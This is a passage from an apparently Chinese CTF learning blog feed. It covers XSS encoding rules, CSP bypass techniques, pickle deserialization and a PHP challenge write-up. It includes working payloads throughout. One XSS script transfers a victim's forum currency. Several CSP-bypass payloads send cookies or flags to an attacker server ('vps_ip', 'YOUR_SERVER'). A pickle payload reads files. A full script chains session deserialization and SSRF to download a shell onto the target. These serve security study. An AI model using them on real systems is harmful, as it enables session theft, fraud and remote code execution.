onclick=&quot;window.open(&#39;value1&#39;)&quot; href=&quot;javascript:window.open(value2)&quot;&gt;</code></pre><p>这里的value1：浏览器看到<code>&lt;</code>标签，可以HTML解码，然后看到<code>onclick</code>可以进行JS解码，最后看到<code>window.open</code>可以进行URL解码</p><p>对于value2而言：浏览器看到<code>&lt;</code>标签进行一个HTML解码，然后看到<code>href</code>进行一个URL解码，再之后看到<code>javascript</code>进行一个JS解码，最后看到了<code>window.open</code>编码进行一个URL解码</p><h3 id="XSS-payload判断是否执行练习"><a href="#XSS-payload判断是否执行练习" class="headerlink" title="XSS payload判断是否执行练习"></a>XSS payload判断是否执行练习</h3><h4 id="1-协议被编码导致无法执行"><a href="#1-协议被编码导致无法执行" class="headerlink" title="1 协议被编码导致无法执行"></a>1 协议被编码导致无法执行</h4><pre><code>&lt;a href=&quot;%6a%61%76%61%73%63%72%69%70%74:%61%6c%65%72%74%28%31%29&quot;&gt;&lt;/a&gt;</code></pre><p>href 丢给URL模块解析，但是协议无法识别（即被编码的<code>javascript:</code>），解码失败，不会被执行</p><h4 id="2-1"><a href="#2-1" class="headerlink" title="2"></a>2</h4><pre><code>&lt;a href=&quot;&amp;#x6a;&amp;#x61;&amp;#x76;&amp;#x61;&amp;#x73;&amp;#x63;&amp;#x72;&amp;#x69;&amp;#x70;&amp;#x74;:%61%6c%65%72%74%28%32%29&quot;&gt;</code></pre><p>先进行htm解码得到  </p><pre><code>javascript:%61%6c%65%72%74%28%32%29</code></pre><p>然后href丢给URL模块解析，得到</p><pre><code>javascript:alert(2)</code></pre><p>可以执行</p><h4 id="3-协议被编码，同1"><a href="#3-协议被编码，同1" class="headerlink" title="3 协议被编码，同1"></a>3 协议被编码，同1</h4><pre><code>&lt;a href=&quot;javascript%3aalert(3)&quot;&gt;&lt;/a&gt;</code></pre><h4 id="4-1"><a href="#4-1" class="headerlink" title="4"></a>4</h4><pre><code>&lt;div&gt;&amp;#60;img src=x onerror=alert(4)&amp;#62;&lt;/div&gt;</code></pre><p>无法执行，因为从HTML解析机制看，在读取<code>&lt;div&gt;</code>之后进入数据状态，<code>&amp;#60;</code>会被HTML解码，但不会进入标签开始状态，当然也就不会创建<code>img</code>元素，也就不会执行</p><h4 id="5-1"><a href="#5-1" class="headerlink" title="5"></a>5</h4><pre><code>&lt;textarea&gt;&amp;#60;script&amp;#62;alert(5)&amp;#60;/script&amp;#62;&lt;/textarea&gt;</code></pre><p>无法执行，<code>&lt;textarea&gt;</code>是<code>RCDATA</code>元素（RCDATA elements），可以容纳文本和字符引用，注意<strong>不能容纳其他元素</strong>，HTML解码得到</p><pre><code>&lt;textarea&gt;&lt;script&gt;alert(5)&lt;/script&gt;&lt;/textarea&gt;</code></pre><h4 id="6-同5-无法执行"><a href="#6-同5-无法执行" class="headerlink" title="6  同5 无法执行"></a>6  同5 无法执行</h4><pre><code>&lt;textarea&gt;&lt;script&gt;alert(6)&lt;/script&gt;&lt;/textarea&gt;</code></pre><h4 id="7"><a href="#7" class="headerlink" title="7"></a>7</h4><pre><code>&lt;button onclick=&quot;confirm(&#39;7&amp;#39;);&quot;&gt;Button&lt;/button&gt;</code></pre><p>这里<code>onclick</code>中为标签的属性值（类比2中的<code>href</code>），会被HTML解码，得到</p><pre><code>&lt;button onclick=&quot;confirm(&#39;7&#39;);&quot;&gt;Button&lt;/button&gt;</code></pre><p>然后被执行</p><h4 id="8"><a href="#8" class="headerlink" title="8"></a>8</h4><pre><code> &lt;button onclick=&quot;confirm(&#39;8\u0027);&quot;&gt;Button&lt;/button&gt;</code></pre><p><code>onclick</code>中的值会交给JS处理，在JS中只有字符串和<a href="https://developer.mozilla.org/zh-CN/docs/Glossary/Identifier" target="_blank" rel="noopener">标识符</a>能用Unicode表示，<code>&#39;</code>显然不行，JS执行失败</p><h4 id="9-1"><a href="#9-1" class="headerlink" title="9"></a>9</h4><pre><code> &lt;script&gt;&amp;#97;&amp;#108;&amp;#101;&amp;#114;&amp;#116&amp;#40;&amp;#57;&amp;#41;&amp;#59&lt;/script&gt;</code></pre><p>无法执行</p><p><code>script</code>属于原始文本元素(Raw text elements)，<strong>只可以容纳文本</strong>，注意<strong>没有字符引用</strong>，于是直接由JS处理，JS也认不出来，执行失败</p><p>原始文本元素(Raw text elements)有<code>&lt;script&gt;</code>和<code>&lt;style&gt;</code></p><h4 id="10"><a href="#10" class="headerlink" title="10"></a>10</h4><pre><code> &lt;script&gt;\u0061\u006c\u0065\u0072\u0074(10);&lt;/script&gt;</code></pre><p>这里js中可以使用Unicode的，只是有些特殊字符不能编码，可以执行</p><h4 id="11-同8，关键字符被编码"><a href="#11-同8，关键字符被编码" class="headerlink" title="11 同8，关键字符被编码"></a>11 同8，关键字符被编码</h4><pre><code> &lt;script&gt;\u0061\u006c\u0065\u0072\u0074\u0028\u0031\u0031\u0029&lt;/script&gt;</code></pre><p>不能执行</p><h4 id="12-由于解码是字符串导致无法执行"><a href="#12-由于解码是字符串导致无法执行" class="headerlink" title="12 由于解码是字符串导致无法执行"></a>12 由于解码是字符串导致无法执行</h4><pre><code> &lt;script&gt;\u0061\u006c\u0065\u0072\u0074(\u0031\u0032)&lt;/script&gt;</code></pre><p>这里看似将没毛病，但是这里<code>\u0031\u0032</code>在解码的时候会被解码为字符串<code>12</code>，注意是<strong>字符串</strong>，不是数字，文字显然是需要引号的，JS执行失败</p><p>这样就行了</p><pre><code> &lt;script&gt;\u0061\u006c\u0065\u0072\u0074(&quot;\u0031\u0032&quot;)&lt;/script&gt;</code></pre><h4 id="14-同8无法执行"><a href="#14-同8无法执行" class="headerlink" title="14 同8无法执行"></a>14 同8无法执行</h4><pre><code> &lt;script&gt;alert(&#39;13\u0027)&lt;/script&gt;</code></pre><h4 id="15"><a href="#15" class="headerlink" title="15"></a>15</h4><pre><code> &lt;a href=&quot;&amp;#x6a;&amp;#x61;&amp;#x76;&amp;#x61;&amp;#x73;&amp;#x63;&amp;#x72;&amp;#x69;&amp;#x70;&amp;#x74;&amp;#x3a;&amp;#x25;&amp;#x35;&amp;#x63;&amp;#x25;&amp;#x37;&amp;#x35;&amp;#x25;&amp;#x33;&amp;#x30;&amp;#x25;&amp;#x33;&amp;#x30;&amp;#x25;&amp;#x33;&amp;#x36;&amp;#x25;&amp;#x33;&amp;#x31;&amp;#x25;&amp;#x35;&amp;#x63;&amp;#x25;&amp;#x37;&amp;#x35;&amp;#x25;&amp;#x33;&amp;#x30;&amp;#x25;&amp;#x33;&amp;#x30;&amp;#x25;&amp;#x33;&amp;#x36;&amp;#x25;&amp;#x36;&amp;#x33;&amp;#x25;&amp;#x35;&amp;#x63;&amp;#x25;&amp;#x37;&amp;#x35;&amp;#x25;&amp;#x33;&amp;#x30;&amp;#x25;&amp;#x33;&amp;#x30;&amp;#x25;&amp;#x33;&amp;#x36;&amp;#x25;&amp;#x33;&amp;#x35;&amp;#x25;&amp;#x35;&amp;#x63;&amp;#x25;&amp;#x37;&amp;#x35;&amp;#x25;&amp;#x33;&amp;#x30;&amp;#x25;&amp;#x33;&amp;#x30;&amp;#x25;&amp;#x33;&amp;#x37;&amp;#x25;&amp;#x33;&amp;#x32;&amp;#x25;&amp;#x35;&amp;#x63;&amp;#x25;&amp;#x37;&amp;#x35;&amp;#x25;&amp;#x33;&amp;#x30;&amp;#x25;&amp;#x33;&amp;#x30;&amp;#x25;&amp;#x33;&amp;#x37;&amp;#x25;&amp;#x33;&amp;#x34;&amp;#x28;&amp;#x31;&amp;#x35;&amp;#x29;&quot;&gt;&lt;/a&gt;</code></pre><p>html解码，得到</p><pre><code> javascript:%5c%75%30%30%36%31%5c%75%30%30%36%63%5c%75%30%30%36%35%5c%75%30%30%37%32%5c%75%30%30%37%34(15)</code></pre><p>href识别出是JavaScript协议，URL解码得到</p><pre><code> javascript:\u0061\u006c\u0065\u0072\u0074(15)</code></pre><p>可以执行</p><p>总结</p><ol><li><script>和<style>数据只能有文本，不会有HTML解码和URL解码操作</li><li><code>&lt;textarea&gt;</code>和<code>&lt;title&gt;</code>里会有HTML解码操作，但不会有子元素</li><li>其他元素数据（如<code>div</code>）和元素属性数据（如<code>href</code>）中会有HTML解码操作</li><li>部分属性（如<code>href</code>）会有URL解码操作，但URL中的协议需为ASCII</li><li>JavaScript会对字符串和标识符Unicode解码</li></ol><h2 id="实例"><a href="#实例" class="headerlink" title="实例"></a>实例</h2><h3 id="tools网站markdown渲染导致xss"><a href="#tools网站markdown渲染导致xss" class="headerlink" title="tools网站markdown渲染导致xss"></a>tools网站markdown渲染导致xss</h3><p><a href="https://www.hackersb.cn/hacker/235.html" target="_blank" rel="noopener">参考</a></p><p>JavaScript伪协议直接弹框</p><p><img src="XSS%E5%AD%A6%E4%B9%A0%E8%AE%B0%E5%BD%95/1582874638329.png" alt="img"></p><p>Discuz的每一步操作都需要 formhash,获取到这个值之后就可以了</p><p><img src="XSS%E5%AD%A6%E4%B9%A0%E8%AE%B0%E5%BD%95/1582874680248.png" alt="img"></p><p>使用图片来触发xss</p><p><img src="XSS%E5%AD%A6%E4%B9%A0%E8%AE%B0%E5%BD%95/1582874701778.png" alt="img"></p><p>最后的payload</p><pre><code> ![头像&quot; onload=alert(1);//](https://www.t00ls.net/uc_server/data/avatar/000/01/08/66_avatar_middle.jpg)</code></pre><p>之后编写js代码来偷走tubi，</p><pre><code> var formhash = document.getElementsByName(&#39;formhash&#39;)[0].value; fetch(&quot;https://www.t00ls.net/misc.php?action=userrate&amp;userratesubmit=yes&amp;infloat=yes&amp;inajax=1&amp;inajax=1&quot;, {   method: &quot;POST&quot;,   credentials: &quot;include&quot;,   headers: {     &quot;Content-Type&quot;: &quot;application/x-www-form-urlencoded&quot;,     &quot;Accept&quot;: &quot;text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8&quot;,     &quot;Accept-Encoding&quot;: &quot;gzip, deflate, br&quot;,     &quot;Upgrade-Insecure-Requests&quot;: &quot;1&quot;,     &quot;Connection&quot;: &#39;keep-alive&#39;,   },   body: &quot;formhash=&quot; + formhash + &quot;&amp;tid=39705&amp;do=dashang&amp;handlekey=userrate&amp;score=%2B10&amp;reason=thanks&quot; }).then(function(res) {   if (res.ok) {     alert(&quot;谢谢你的10Tubi！！！&quot;);   } }, function(e) {   alert(&quot;Error submitting form!&quot;); });</code></pre><p>然后插入图片，引用这个js即可</p></script></li></ol>]]></content>
      
      
      <categories>
          
          <category> CTF </category>
          
      </categories>
      
      
        <tags>
            
            <tag> XSS </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>绕过CSP</title>
      <link href="/posts/1e1d8fb4/"/>
      <url>/posts/1e1d8fb4/</url>
      
        <content type="html"><![CDATA[<h2 id="基本概念"><a href="#基本概念" class="headerlink" title="基本概念"></a>基本概念</h2><table><thead><tr><th><code>default-src</code></th><th><code>&#39;self&#39; cdn.example.com</code></th><th>定义资源默认加载策略</th></tr></thead><tbody><tr><td><code>script-src</code></td><td><code>&#39;self&#39; js.example.com</code></td><td>定义 JS 加载策略</td></tr><tr><td><code>style-src</code></td><td><code>&#39;self&#39; css.example.com</code></td><td>定义 CSS 加载策略</td></tr><tr><td><code>img-src</code></td><td><code>&#39;self&#39; img.example.com</code></td><td>定义图片加载策略</td></tr><tr><td><code>connect-src</code></td><td><code>&#39;self&#39;</code></td><td>定义 Ajax、WebSocket 等加载策略</td></tr><tr><td><code>font-src</code></td><td><code>font.example.com</code></td><td>定义 Font 加载策略</td></tr><tr><td><code>object-src</code></td><td><code>&#39;self&#39;</code></td><td>定义 、、 等引用资源加载策略</td></tr><tr><td><code>media-src</code></td><td><code>media.example.com</code></td><td>定义</td></tr><tr><td><code>frame-src</code></td><td><code>&#39;self&#39;</code></td><td>定义 Frame 加载策略</td></tr><tr><td><code>sandbox</code></td><td><code>allow-forms allow-scripts</code></td><td>对页面的操作应用限制，包括阻止弹出窗口，阻止插件和脚本的执行以及强制执行同源策略。可以不设置sanbox的值使得所有限制启用，或者手动启用以下属性 : <code>allow-forms</code> <code>allow-same-origin</code> <code>allow-scripts</code> <code>allow-popups</code>, <code>allow-modals</code>, <code>allow-orientation-lock</code>, <code>allow-pointer-lock</code>, <code>allow-presentation</code>, <code>allow-popups-to-escape-sandbox</code>, and <code>allow-top-navigation</code></td></tr><tr><td><code>report-uri</code></td><td><code>/some-report-uri</code></td><td>指定浏览器报告策略错误的URL，可以在HTTP头中添加<code>-Report-Only</code> 来指示浏览器只报告不阻断</td></tr><tr><td><code>child-src</code></td><td><code>&#39;self&#39;</code></td><td>child-src指令管理了套嵌浏览的部分（类似于iframe、frame标签）</td></tr><tr><td><code>form-action</code></td><td><code>&#39;self&#39;</code></td><td>定义了form表单中action的范围</td></tr><tr><td><code>frame-ancestors</code></td><td><code>&#39;none&#39;</code></td><td>定义<code>&lt;frame&gt;</code> <code>&lt;iframe&gt;</code> <code>&lt;object&gt;</code> <code>&lt;embed&gt;</code> <code>&lt;applet&gt;</code>加载策略. 直接设置<code>‘none’</code> 几乎等于设置了<code>X-Frame-Options: DENY</code></td></tr><tr><td><code>plugin-types</code></td><td><code>application/pdf</code></td><td>设置有效的MIME类型</td></tr></tbody></table><h2 id="CSP绕过"><a href="#CSP绕过" class="headerlink" title="CSP绕过"></a>CSP绕过</h2><h3 id="使用CDN绕过"><a href="#使用CDN绕过" class="headerlink" title="使用CDN绕过"></a>使用CDN绕过</h3><p>一般来说，前端会用到许多的前端框架和库，可能会引用其他CDN上的JS框架，如果CDN上存在一些低版本的框架，就可能存在绕过CSP的风险</p><p>案例中hackmd中CSP引用了cloudflare.com CDN服务，于是orange师傅采用了低版本的angular js模板注入来绕过CSP</p><pre><code class="html">&lt;meta http-equiv=&quot;Content-Security-Policy&quot; content=&quot;default-src &#39;self&#39;; script-src &#39;unsafe-eval&#39; https://cdnjs.cloudflare.com;&quot;&gt;&lt;!-- foo=&quot;--&gt;&lt;script src=https://cdnjs.cloudflare.com/ajax/libs/angular.js/1.0.8/angular.min.js&gt;&lt;/script&gt;&lt;div ng-app&gt;    {{constructor.constructor('alert(document.cookie)')()}}&lt;/div&gt;</code></pre><p><a href="https://github.com/hackmdio/codimd/pull/1112/commits/067cfe2d1eedc5a58e5548785858e38fbaa0e84b" target="_blank" rel="noopener">修复</a></p><p><a href="https://paper.seebug.org/855/" target="_blank" rel="noopener">orange师傅的文章</a></p><p>利用条件:</p><ol><li>CDN服务商存在某些低版本的js库</li><li>此CDN服务商在CSP白名单中</li></ol><h3 id="location-href"><a href="#location-href" class="headerlink" title="location.href"></a>location.href</h3><p>通过页面跳转功能来实现</p><pre><code>location.href = &quot;vps_ip:xxxx?&quot;+document.cookie</code></pre><h3 id="link标签绕过-比较老了"><a href="#link标签绕过-比较老了" class="headerlink" title="link标签绕过(比较老了)"></a>link标签绕过(比较老了)</h3><pre><code>&lt;!-- firefox --&gt;&lt;link rel=&quot;dns-prefetch&quot; href=&quot;//${cookie}.vps_ip&quot;&gt;&lt;!-- chrome --&gt;&lt;link rel=&quot;prefetch&quot; href=&quot;//vps_ip?${cookie}&quot;&gt;</code></pre><p>带外数据的写法</p><pre><code class="js">var link = document.createElement(&quot;link&quot;);link.setAttribute(&quot;rel&quot;, &quot;prefetch&quot;);link.setAttribute(&quot;href&quot;, &quot;//vps_ip/?&quot; + document.cookie);document.head.appendChild(link);</code></pre><p>使用条件：</p><p>k可以执行任意的js脚本，但是无法带外数据</p><h3 id="iframe绕过"><a href="#iframe绕过" class="headerlink" title="iframe绕过"></a>iframe绕过</h3><blockquote><p>当一个同源站点，同时存在两个页面，其中一个有CSP保护的A页面，另一个没有CSP保护B页面，那么如果B页面存在XSS漏洞，我们可以直接在B页面新建iframe用javascript直接操作A页面的dom，可以说A页面的CSP防护完全失效</p></blockquote><h3 id="jsonp绕过"><a href="#jsonp绕过" class="headerlink" title="jsonp绕过"></a>jsonp绕过</h3><p><a href="https://github.com/google/csp-evaluator/tree/master/whitelist_bypasses" target="_blank" rel="noopener">收集</a></p><h2 id="CSP绕过实例"><a href="#CSP绕过实例" class="headerlink" title="CSP绕过实例"></a>CSP绕过实例</h2><h3 id="BSidesSF-2020-csp-1"><a href="#BSidesSF-2020-csp-1" class="headerlink" title="BSidesSF 2020 csp-1"></a>BSidesSF 2020 csp-1</h3><p>csp如下，<code>script-src</code> 支持 data</p><pre><code class="j">content-security-policy:     script-src &#39;self&#39; data:;     default-src &#39;self&#39;;     connect-src *;     report-uri /csp_report</code></pre><p>可以使用 <code>fetch</code> (js实在是不熟悉)</p><p>payload-1</p><pre><code>&lt;script src=&quot;data:,fetch(&#39;/csp-one-flag&#39;).then(x=&gt;x.text()).then(x=&gt;location=&#39;http://rwx.kr/?&#39;+escape(x))&quot;&gt;</code></pre><p>或者编码也是可以的</p><pre><code>// NOTE:// &quot;ZmV0Y...&quot; is base64 encoded text of this script.// fetch(&quot;https://csp-1-5aa1f221.challenges.bsidessf.net/csp-one-flag&quot;).then(r=&gt;r.text()).then(t=&gt;fetch(&quot;YOUR_SERVER&quot;+t))&lt;script src=&quot;data:text/javascript;base64,ZmV0Y2goImh0dHBzOi8vY3NwLTEtNWFhMWYyMjEuY2hhbGxlbmdlcy5ic2lkZXNzZi5uZXQvY3NwLW9uZS1mbGFnIikudGhlbihyPT5yLnRleHQoKSkudGhlbih0PT5mZXRjaCgiWU9VUl9TRVJWRVIiK3QpKQ==&quot;&gt;&lt;/script&gt;</code></pre><h3 id="csp-2"><a href="#csp-2" class="headerlink" title="csp-2"></a>csp-2</h3><pre><code>Content-Security-Policy: script-src &#39;self&#39; ajax.googleapis.com &#39;unsafe-eval&#39;; default-src &#39;self&#39; &#39;unsafe-inline&#39;; connect-src *; report-uri /csp_report</code></pre><p>看到了 <code>ajax.googleapis.com</code> 在白名单中，可以使用其提供的angularjs的模板注入来绕过</p><pre><code class="html">&lt;script src=https://ajax.googleapis.com/ajax/libs/angularjs/1.0.1/angular.min.js&gt;&lt;/script&gt;&lt;div ng-app ng-csp&gt;{{constructor.constructor('eval(atob("ZmV0Y2goIi9jc3AtdHdvLWZsYWciKS50aGVuKHg9PngudGV4dCgpKS50aGVuKHg9PmxvY2F0aW9uPSIvL3J3eC5rci8/Iitlc2NhcGUoeCkp"))')()}}&lt;/div&gt;</code></pre><p>payload2</p><pre><code class="js">&lt;script src=&quot;//ajax.googleapis.com/ajax/libs/angularjs/1.1.5/angular.min.js&quot;&gt;&lt;/script&gt; &lt;div class=&quot;ng-app&quot;&gt; {{ constructor.constructor('fetch("https://csp-2-2446d5a3.challenges.bsidessf.net/csp-two-flag").then(r=>r.text()).then(t=>fetch("YOUR_SERVER"+t))')() }} &lt;/div&gt;</code></pre>]]></content>
      
      
      <categories>
          
          <category> CTF </category>
          
      </categories>
      
      
        <tags>
            
            <tag> CSP </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>python字符串的一些小坑</title>
      <link href="/posts/e247dc77/"/>
      <url>/posts/e247dc77/</url>
      
        <content type="html"><![CDATA[]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title>pickle反序列化</title>
      <link href="/posts/2d71dd35/"/>
      <url>/posts/2d71dd35/</url>
      
        <content type="html"><![CDATA[<p>就分析几道例题吧</p><h2 id="CISCN-2019-ikun"><a href="#CISCN-2019-ikun" class="headerlink" title="CISCN 2019 ikun"></a>CISCN 2019 ikun</h2><p>这题开始脑洞比较大</p><p><img src="/posts/2d71dd35/1583819034564.png" alt></p><p>然后观察URL</p><pre><code>http://b8869902-7911-4d16-bb0c-fe61550e2cea.node3.buuoj.cn/shop?page=1</code></pre><p>开始以为这里有注入，因为加一个单引号网站就崩了</p><p>但是不然。是需要找到 <code>lv6</code></p><pre><code class="python">import requestsURL = &quot;http://b8869902-7911-4d16-bb0c-fe61550e2cea.node3.buuoj.cn/shop?page=&quot;for i in range(2000):    res = requests.get(URL+str(i))    if b&quot;lv6.png&quot; in res.content:        print(i)        break</code></pre><p>注意 <code>res.content</code> 返回的是byte类型， <code>res.text</code> 会自动转码为字符串</p><p>得到的结果是181</p><p><img src="/posts/2d71dd35/1583819267198.png" alt></p><p>当然按照管理你是买不起的</p><p>抓个包改一下折扣</p><p><img src="/posts/2d71dd35/1583819306763.png" alt></p><p>进入后台 </p><pre><code>http://b8869902-7911-4d16-bb0c-fe61550e2cea.node3.buuoj.cn/b1g_m4mber</code></pre><p><img src="/posts/2d71dd35/1583819326133.png" alt></p><p>注意到是用jwt认证的，爆破一下</p><p><img src="/posts/2d71dd35/1583819359124.png" alt></p><p>然后伪造一下进入admin，查看页面源代码有代码下载地址</p><p>审计代码</p><p>看到 <code>Admin.py</code></p><pre><code class="python">import tornado.webfrom sshop.base import BaseHandlerimport pickleimport urllibclass AdminHandler(BaseHandler):    @tornado.web.authenticated    def get(self, *args, **kwargs):        if self.current_user == &quot;admin&quot;:            return self.render(&#39;form.html&#39;, res=&#39;This is Black Technology!&#39;, member=0)        else:            return self.render(&#39;no_ass.html&#39;)    @tornado.web.authenticated    def post(self, *args, **kwargs):        try:            become = self.get_argument(&#39;become&#39;)            p = pickle.loads(urllib.unquote(become))            return self.render(&#39;form.html&#39;, res=p, member=1)        except:            return self.render(&#39;form.html&#39;, res=&#39;This is Black Technology!&#39;, member=0)</code></pre><p>会反序列化传过来的 become 参数，于是</p><pre><code class="python">import pickleimport urllibclass payload(object):    def __reduce__(self):       return (eval, (&quot;open(&#39;/flag.txt&#39;,&#39;r&#39;).read()&quot;,))a = pickle.dumps(payload())a = urllib.quote(a)print a</code></pre><p>生成</p><pre><code>c__builtin__%0Aeval%0Ap0%0A%28S%22open%28%27/flag.txt%27%2C%27r%27%29.read%28%29%22%0Ap1%0Atp2%0ARp3%0A.</code></pre><p>提交即可</p><p><img src="/posts/2d71dd35/1583819516737.png" alt></p><h2 id="抗疫分享赛webtmp"><a href="#抗疫分享赛webtmp" class="headerlink" title="抗疫分享赛webtmp"></a>抗疫分享赛webtmp</h2><p>这题涉及到了如何手动构造 pickle 数据</p><p>复习一下指令</p>]]></content>
      
      
      <categories>
          
          <category> CTF </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 反序列化 </tag>
            
            <tag> pickle </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>常用的网站</title>
      <link href="/posts/f364e7d6/"/>
      <url>/posts/f364e7d6/</url>
      
        <content type="html"><![CDATA[<h2 id="大师傅"><a href="#大师傅" class="headerlink" title="大师傅"></a>大师傅</h2><p><a href="http://szfszf.top/" target="_blank" rel="noopener">http://szfszf.top/</a></p><h2 id="JWT"><a href="#JWT" class="headerlink" title="JWT"></a>JWT</h2><p><a href="https://jwt.io/" target="_blank" rel="noopener">https://jwt.io/</a></p>]]></content>
      
      
      <categories>
          
          <category> CTF </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 网站 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>tornado框架</title>
      <link href="/posts/11fc1d3/"/>
      <url>/posts/11fc1d3/</url>
      
        <content type="html"><![CDATA[]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title>jwt学习笔记</title>
      <link href="/posts/70fc8f0c/"/>
      <url>/posts/70fc8f0c/</url>
      
        <content type="html"><![CDATA[]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title>requests文档阅读笔记</title>
      <link href="/posts/bce54486/"/>
      <url>/posts/bce54486/</url>
      
        <content type="html"><![CDATA[<h2 id="如何发送post请求"><a href="#如何发送post请求" class="headerlink" title="如何发送post请求"></a>如何发送post请求</h2><pre><code> r = requests.post(&#39;http://httpbin.org/post&#39;, data = {&#39;key&#39;:&#39;value&#39;})</code></pre><p>其他的请求也类似</p><pre><code>&gt;&gt;&gt; r = requests.put(&#39;http://httpbin.org/put&#39;, data = {&#39;key&#39;:&#39;value&#39;})&gt;&gt;&gt; r = requests.delete(&#39;http://httpbin.org/delete&#39;)&gt;&gt;&gt; r = requests.head(&#39;http://httpbin.org/get&#39;)&gt;&gt;&gt; r = requests.options(&#39;http://httpbin.org/get&#39;)</code></pre><h2 id="GET请求如何传递URL参数"><a href="#GET请求如何传递URL参数" class="headerlink" title="GET请求如何传递URL参数"></a>GET请求如何传递URL参数</h2><pre><code>In [12]: r = requests.get(url,params={&quot;key1&quot;:&quot;1&quot;, &quot;key2&quot;:&quot;2&quot;})In [13]: r.urlOut[13]: &#39;http://httpbin.org/get?key2=2&amp;key1=1&#39;</code></pre><p>但是怎么传递数组呢？这是个问题</p>]]></content>
      
      
      <categories>
          
          <category> 编程 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 文档 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>战疫分享赛wp</title>
      <link href="/posts/2f3193b1/"/>
      <url>/posts/2f3193b1/</url>
      
        <content type="html"><![CDATA[<h2 id="hackme"><a href="#hackme" class="headerlink" title="hackme"></a>hackme</h2><p><a href="http://www.zip源码，审计之后看到两个很有意思的操作" target="_blank" rel="noopener">www.zip源码，审计之后看到两个很有意思的操作</a></p><p>根目录下的 <code>init.php</code>文件中</p><pre><code class="php">&lt;?php//初始化整个页面error_reporting(0);//lib.php包括一些常见的函数include &#39;lib.php&#39;;session_save_path(&#39;session&#39;);ini_set(&#39;session.serialize_handler&#39;,&#39;php_serialize&#39;);session_start();</code></pre><p>但是在 <code>core</code> 目录下的 <code>init.php</code> 中</p><pre><code class="php">&lt;?php//初始化整个页面#error_reporting(0);//lib.php包括一些常见的函数include &#39;../lib.php&#39;;session_save_path(&#39;../session&#39;);ini_set(&#39;session.serialize_handler&#39;, &#39;php&#39;);session_start();</code></pre><p>用了两种不同的session处理方式</p><p>所以提交一个签名为</p><pre><code>|O:4:&quot;info&quot;:1:{s:5:&quot;admin&quot;;i:1;}</code></pre><p>这样再访问 <code>profile.php</code> 的时候</p><pre><code class="php">&lt;?phperror_reporting(0);session_save_path(&#39;session&#39;);include &#39;lib.php&#39;;ini_set(&#39;session.serialize_handler&#39;, &#39;php&#39;);session_start();class info{    public $admin;    public $sign;    public function __construct()    {        $this-&gt;admin = $_SESSION[&#39;admin&#39;];        $this-&gt;sign = $_SESSION[&#39;sign&#39;];    }    public function __destruct()    {        echo $this-&gt;sign;        if ($this-&gt;admin === 1) {            redirect(&#39;./core/index.php&#39;);        }    }}$a = new info();?&gt;</code></pre><p>就会触发反序列化，然后进入 <code>core/index.php</code> 中</p><p><code>core/index.php</code> 的源代码</p><pre><code>&lt;?phprequire_once(&#39;./init.php&#39;);error_reporting(0);if (check_session($_SESSION)) {    #hint : core/clear.php    $sandbox = &#39;./sandbox/&#39; . md5(&quot;Mrk@1xI^&quot; . $_SERVER[&#39;REMOTE_ADDR&#39;]);    echo $sandbox;    @mkdir($sandbox);    @chdir($sandbox);    if (isset($_POST[&#39;url&#39;])) {        $url = $_POST[&#39;url&#39;];        if (filter_var($url, FILTER_VALIDATE_URL)) {            if (preg_match(&#39;/(data:\/\/)|(&amp;)|(\|)|(\.\/)/i&#39;, $url)) {                echo &quot;you are hacker&quot;;            } else {                $res = parse_url($url);                if (preg_match(&#39;/127\.0\.0\.1$/&#39;, $res[&#39;host&#39;])) {                    $code = file_get_contents($url);                    if (strlen($code) &lt;= 4) {                        @exec($code);                    } else {                        echo &quot;try again&quot;;                    }                }            }        } else {            echo &quot;invalid url&quot;;        }    } else {        highlight_file(__FILE__);    }} else {    die(&#39;只有管理员才能看到我哟&#39;);}</code></pre><p>不准用 <code>data</code> 协议，并且解析到的host必须是 <code>127.0.0.1</code> 初看还挺像2019年的byteCTF，但是这里用到的是 <code>compress.zlib</code> 协议(学习了)</p><pre><code>compress.zlib://data:@127.0.0.1/baidu.com?,ls</code></pre><p>当然也可以用base64的方式</p><pre><code>compress.zlib://data:@127.0.0.1/plain;base64,</code></pre><p>之后需要绕过长度来执行命令，脚本就用队友的好了，不能弹shell，只能从vps上下载shell到靶机上</p><pre><code class="python">import requestsfrom time import sleepfrom urllib import parsefrom requests import sessionimport base64import randoms = session()url = &quot;http://121.36.222.22:88/login.php&quot;s.post(url, data={&#39;name&#39;:&#39;pxypxy&#39;})url1 = &quot;http://121.36.222.22:88/?page=upload&quot;s.post(url1, data={&#39;sign&#39;:&#39;woc|O:4:&quot;info&quot;:2:{s:5:&quot;admin&quot;;i:1;s:4:&quot;sign&quot;;s:4:&quot;ssss&quot;;}&#39;})url3 = &quot;http://121.36.222.22:88/core/index.php&quot;s.get(url3)ip = &#39;x.x.x.x&#39;ip = &#39;0x&#39; + &#39;&#39;.join([str(hex(int(i))[2:].zfill(2))for i in ip.split(&#39;.&#39;)])pos0 = &#39;y&#39;pos1 = &#39;d&#39;pos2 = &#39;s&#39;payload = [    &#39;&gt;dir&#39;,    &#39;&gt;%s\&gt;&#39; % pos0,    &#39;&gt;%st-&#39; % pos1,    &#39;&gt;sl&#39;,    &#39;*&gt;v&#39;,    &#39;&gt;rev&#39;,    &#39;*v&gt;%s&#39; % pos2,    &#39;&gt;p&#39;,    &#39;&gt;ph\\&#39;,    &#39;&gt;y.\\&#39;,    &#39;&gt;\&gt;\\&#39;,    &#39;&gt;%s\\&#39; % ip[8:10],    &#39;&gt;%s\\&#39; % ip[6:8],    &#39;&gt;%s\\&#39; % ip[4:6],    &#39;&gt;%s\\&#39; % ip[2:4],    &#39;&gt;%s\\&#39; % ip[0:2],    &#39;&gt;\ \\&#39;,    &#39;&gt;rl\\&#39;,    &#39;&gt;cu\\&#39;,    &#39;sh &#39; + pos2,    &#39;sh &#39; + pos0,]for i in payload:    data = {&#39;url&#39;:&#39;compress.zlib://data:@127.0.0.1/plain;base64,&#39;+base64.b64encode(i.encode()).decode()}    r = s.post(url3, data=data)    print(r.text)    print(data[&#39;url&#39;])    sleep(0.1)</code></pre><h2 